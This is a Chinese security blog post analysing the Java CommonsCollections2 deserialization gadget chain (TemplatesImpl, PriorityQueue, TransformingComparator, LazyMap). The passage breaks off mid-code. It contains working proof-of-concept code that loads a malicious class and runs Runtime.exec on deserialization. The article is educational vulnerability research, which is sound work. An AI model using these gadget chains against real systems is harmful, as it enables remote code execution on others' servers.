@@ -1,0 +1,1577 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="JAVA反序列篇-CommonsCollections2引发的思考, 学的越深越发现自己的渺小">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>JAVA反序列篇-CommonsCollections2引发的思考 | 学的越深越发现自己的渺小</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">学的越深越发现自己的渺小</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">学的越深越发现自己的渺小</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">JAVA反序列篇-CommonsCollections2引发的思考</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-24
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>首发于Freebuf安全社区<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/326296.html">CommonsCollections2引发的思考</a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面分析了<code>CC1</code>的利用链，在<code>JDK1.8 8u71</code>版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写。导致高版本中利用链无法使用。然后又分析了<code>CC6</code>的利用链。解决了<code>CC1</code>的高版本JDK利用问题。</p>
+<p><strong>传送门</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/325843.html">JAVA反序列入门篇-CommonsCollections1分析</a></p>
+<p><a href="https://keepaha.com/2022/03/23/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollecion6%E5%88%86%E6%9E%90/#toc-heading-3">JAVA反序列篇-CommonsCollecion6分析</a></p>
+<p>那为什么需要学习<code>CommonsCollections2</code>呢？</p>
+<ul>
+<li>学习新的利用方式，竟然CC2是在CC6之前出来的，那肯定有不同的姿势，学习CC2是如何绕过CC1的高版本限制。</li>
+<li><code>CommonsCollection2</code>为何在<code>CommonsCollections 3.2.1-3.1</code>版本不能去使用，又如何解决呢？</li>
+<li>在<code>CommonsCollections-4.0</code>版本中，删除了<code>lazyMap</code>的<code>decorate</code>方法，我们又怎么解决呢？</li>
+</ul>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="①javassist"><a href="#①javassist" class="headerlink" title="①javassist"></a>①javassist</h3><p>通常我们需要将<code>.java</code> 编译成 <code>.class</code> 才能正常运行，在命令行中我们通常使用<code>javac</code> 来进行编译，利用编译生成的固定格式的字节码(.class) 来供jvm虚拟机进行使用，每一个class文件中都包含着一个java类或一个接口。</p>
+<p><code>javassist</code>就是一个处理字节码的类库，能够动态的修改class中的字节码。在 Javassist 中，类 <code>Javaassit.CtClass</code> 表示 class 文件。一个 GtClass (编译时类）对象可以处理一个 class 文件。</p>
+<p><strong>例子</strong></p>
+<pre><code>ClassPool pool = ClassPool.getDefault();
+CtClass cc = pool.get(&quot;com.Test1&quot;);
+cc.setSuperclass(pool.get(&quot;com.Test2&quot;));
+cc.writeFile();</code></pre>
+<p>ClassPool 是一个存储 CtClass 的 Hash 表，类的名称作为 Hash 表的 key。ClassPool 的 get() 函数用于从 Hash 表中查找 key 对应的 CtClass 对象。如果没有找到，get() 函数会创建并返回一个新的 CtClass 对象，这个新对象会保存在 Hash 表中。</p>
+<ul>
+<li><code>getDefault()</code> 方法返回了默认的类池（默认的类池搜索系统搜索路径，通常包括平台库、扩展库以及由-classpath选项或CLASSPATH环境变量指定的搜索路径）</li>
+<li><code>get() </code>方法来 <code>ClassPool</code> 中获得一个 <code>com.Test1</code>类的<code> CtClass</code> 对象的引用，并将其赋值给变量 cc</li>
+<li><code>setSuperclass</code>方法将<code>com.Test1</code> 的父类被设置为<code>com.Test2</code></li>
+<li><code>writeFile() </code>方法会将修改后的<code>CtClass</code> 对象转换成类文件并写到本地磁盘</li>
+</ul>
+<p>对比一下原本和新的class文件</p>
+<p><img src="/images/395.png"></p>
+<p><img src="/images/396.png"></p>
+<p>再介绍几个方法</p>
+<ul>
+<li><code>makeClass()</code>和<code>makeInterface()</code></li>
+</ul>
+<pre><code>//创建名为Evil的类
+CtClass test = pool.makeClass(&quot;Evil&quot;);
+
+//创建名为Evil的接口
+CtClass test = pool.makeInterface(&quot;Evil&quot;);</code></pre>
+<ul>
+<li><code>makeClassInitializer()</code></li>
+</ul>
+<pre><code>#创建一个空的类初始化器（静态构造函数）
+CtConstructor constructor = test.makeClassInitializer();</code></pre>
+<h3 id="②ClassLoader"><a href="#②ClassLoader" class="headerlink" title="②ClassLoader"></a>②ClassLoader</h3><p><code>ClassLoader</code>是Java的类加载器，负责将<strong>字节码转化成内存中的Java类</strong></p>
+<p>我们这里可以利用类加载器的<code>defineClass</code>方法来加载我们的字节码</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.*;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class CommmonsCollections2 &#123;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException, CannotCompileException, NotFoundException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchMethodException &#123;
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass test = pool.makeClass(&quot;Evil&quot;);
+        test.setSuperclass(pool.get(&quot;Test&quot;));
+        test.writeFile(&quot;./&quot;);
+        byte[] bytes = test.toBytecode();
+        Class clas = Class.forName(&quot;java.lang.ClassLoader&quot;);
+        Method defineclass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+        defineclass.setAccessible(true);
+        Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length);
+        Test e = (Test) claz.newInstance();
+        e.hello();
+    &#125;
+&#125;</code></pre>
+<pre><code>public class Test &#123;
+
+    public static void main(String[] args) &#123;
+
+    &#125;
+    public void hello()&#123;
+        System.out.println(&quot;hello Test&quot;);
+    &#125;
+&#125;</code></pre>
+<p><img src="/images/397.png"></p>
+<p><strong>注：后面有用</strong></p>
+<p>这里需要注意的是，<code>ClassLoader#defineClass</code>返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令</p>
+<h3 id="③TemplatesImpl"><a href="#③TemplatesImpl" class="headerlink" title="③TemplatesImpl"></a>③TemplatesImpl</h3><p>在<code>TemplatesImpl</code>类中定义了一个内部类<code>defineClass</code>，这个类中对<code>defineClass</code>进行了重写，并且没有显式的对定义域进行声明，可以被外部进行调用。</p>
+<p><img src="/images/398.png"></p>
+<p>这个类的特别之处就是,在调用他的 <code>newTransformer</code> 或者 <code>getOutputProperties</code>时,会动态从字节码中重建一个类。这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码。</p>
+<p><strong>TemplatesImpI类分析</strong></p>
+<p>写贴一个半成品<strong>链条</strong></p>
+<pre><code>TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+        TemplatesImpl.defineTransletClasses()
+            TransletClassLoader.defineClass()
+                TemplatesImpl.getTransletInstance()-&gt;_class[_transletIndex].newInstance()
+                    Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p><code>TemplatesImpl.newTransformer()</code>调用<code>getTransletInstance()</code></p>
+<p><img src="/images/399.png"></p>
+<p>跟进<code>getTransletInstance()</code>方法，当<code>_name</code>不为null且<code>_class</code>为null,触发<code>defineTransletClasses()</code>方法</p>
+<p><img src="/images/400.png"></p>
+<p>跟进<code>defineTransletClasses()</code>方法，<code>_bytecodes</code>设置为我们要读取的字节码，就是传进去的<strong>恶意字节码</strong>。也需要设置<code>_tfactory</code> 不然就会返回null，无法到达触发点。<code>_tfactory</code> 是<code>TransformerFactoryImpl</code>类，所以我们只需要传入<code>new TransformerFactoryImpl()</code> 就可以了。</p>
+<p><img src="/images/419.png"></p>
+<p><img src="/images/401.png"></p>
+<p><code>loader.defineClass</code>将字节码转化成内存中的Java类。然后获取当前<code>_class</code>的<code>getSuperclass()</code>超类，就是恶意字节码的超类。再进行判断这个超类是不是等于<code>ABSTRACT_TRANSLET</code>，如果相等执行if里面的<code>_transletIndex</code>赋值操作。</p>
+<p><img src="/images/403.png"></p>
+<p>查看下<code>ABSTRACT_TRANSLET</code>可以看到指向的是<code>AbstractTranslet</code>类，所以我们的恶意类也要继承<code>AbstractTranslet</code>类。</p>
+<p><img src="/images/404.png"></p>
+<p><strong>构造恶意类</strong></p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Evil  extends AbstractTranslet &#123;
+    static &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (Exception e) &#123;&#125;
+    &#125;
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+    &#125;
+&#125;</code></pre>
+<p><strong>测试POC</strong></p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class CommmonsCollections2 &#123;
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123;
+
+        TemplatesImpl templates=new TemplatesImpl();
+        //获取TemplatesImpl的Class
+        Class tc=templates.getClass();
+        Field nameField=tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        //加载恶意类
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class&quot;));
+        byte[][] codes=&#123;code&#125;;
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField=tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        //调用
+        templates.newTransformer();
+    &#125;
+&#125;</code></pre>
+<p><strong>成功弹出计算器</strong></p>
+<p><img src="/images/405.png"></p>
+<p>漏洞执行点，<code>TemplatesImpl.getTransletInstance()-&gt;_class[_transletIndex].newInstance()</code>初始化恶意类，执行恶意代码。</p>
+<p><img src="/images/406.png"></p>
+<h2 id="Gadget链条分析"><a href="#Gadget链条分析" class="headerlink" title="Gadget链条分析"></a>Gadget链条分析</h2><pre><code>Gadget chain:
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                TransformingComparator.compare()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                TemplatesImpl.newTransformer()
+                                    TemplatesImpl.getTransletInstance()
+                                        TemplatesImpl.defineTransletClasses()
+                                            TransletClassLoader.defineClass()
+                                                newInstance()
+                                                    Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p>上面我们已经分析了后半部分链条，现在分析下如何触发<code>TemplatesImpl.newTransformer()</code>，利用到一个新的类<code>TransformingComparator</code>，看下构造方法和触发的方法。</p>
+<p><code>TransformingComparator</code>类和<code>ChainedTransformer</code>类相似，都是通过触发<code>this.xxx.transform()</code>方法去触发，<code>InvokerTransformer.transform()</code>方法，然后执行<code>TemplatesImpl.newTransformer()</code>完成链条的利用。</p>
+<p><img src="/images/413.png"></p>
+<p>下一步继续往前推，如何触发<code>TransformingComparator.compare()</code>方法。</p>
+<p><strong>PriorityQueue类</strong></p>
+<p>优先队列<code>PriorityQueue</code>是<code>Queue</code>接口的实现，可以对其中元素进行排序。此类重写了<code>readObject</code>方法，跟进下。</p>
+<p>对传入的<code>ObjectInputStream</code>进行反序列化然后赋值给<code>queue</code>数组，然后<code>heapify()</code> 进行排序。</p>
+<p><img src="/images/414.png"></p>
+<p>跟进<code>heapify()</code>方法，调用<code>siftDown()</code>方法，<code>queue[i]</code>是我们可控的。</p>
+<p><img src="/images/415.png"></p>
+<p>跟进<code>siftDown()</code>方法，<code>comparator</code>不为null，调用<code>siftDownUsingComparator()</code>方法</p>
+<p><img src="/images/416.png"></p>
+<p>跟进<code>siftDownUsingComparator()</code>方法，调用了<code>comparator.compare()</code>方法, 同时 <code>x</code> 可控，我们利用反射设置<code>comparator</code>为<code>TransformingComparator</code>类就行。</p>
+<p><img src="/images/417.png"></p>
+<p><strong>最终POC代码</strong></p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CommmonsCollections2 &#123;
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException &#123;
+
+        TemplatesImpl templates=new TemplatesImpl();
+        //获取TemplatesImpl的Class
+        Class tc=templates.getClass();
+        Field nameField=tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        //加载恶意类
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class&quot;));
+        byte[][] codes=&#123;code&#125;;
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField=tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;),
+
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+        //长度是2才能满足条件
+        PriorityQueue queue = new PriorityQueue();
+        queue.add(1);
+        queue.add(2);
+        //修改comparator属性
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,transformingComparator);
+        //序列化
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2.ser&quot;));
+        objectOutputStream.writeObject(queue);
+        objectOutputStream.close();
+        //反序列化
+        ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream(&quot;./cc2.ser&quot;));
+        objectInputStream.readObject();
+        objectInputStream.close();
+    &#125;
+&#125;</code></pre>
+<p><img src="/images/418.png"></p>
+<h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><p><strong>在<code>CommonsCollections-4.0</code>版本中，删除了<code>lazyMap</code>的<code>decorate</code>方法，我们怎么解决呢？</strong></p>
+<p><strong>环境</strong></p>
+<pre><code>CommonsColections 4.0
+JDk8u_101</code></pre>
+<p>虽然在4版本中删除了<code>decorate</code>方法，但还有另外一个构造方法<code>LazyMap</code>，可以直接让传进的<code>Transformer</code>赋值给<code>this.factory</code>。</p>
+<p><img src="/images/407.png"></p>
+<p><strong>Gadget链条</strong></p>
+<pre><code>Gadget chain:
+    ObjectInputStream.readObject()
+        HashMap.readObject()
+            HashMap.hash()
+                TiedMapEntry.hashCode()
+                    TiedMapEntry.getValue()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        TemplatesImpl.newTransformer()
+                                            TemplatesImpl.getTransletInstance()
+                                                TemplatesImpl.defineTransletClasses()
+                                                    TransletClassLoader.defineClass()
+                                                        newInstance()
+                                                            Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p><strong>最终POC代码</strong></p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
+
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommmonsCollections2 &#123;
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;
+
+        TemplatesImpl templates=new TemplatesImpl();
+        //获取TemplatesImpl的Class
+        Class tc=templates.getClass();
+        Field nameField=tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        //加载恶意类
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class&quot;));
+        byte[][] codes=&#123;code&#125;;
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField=tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] fakeTransformers = new Transformer[]&#123;new ConstantTransformer(1)&#125;;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;),
+
+        &#125;;
+
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+        Map innerMap = new HashMap();
+
+        Class clazz = LazyMap.class;
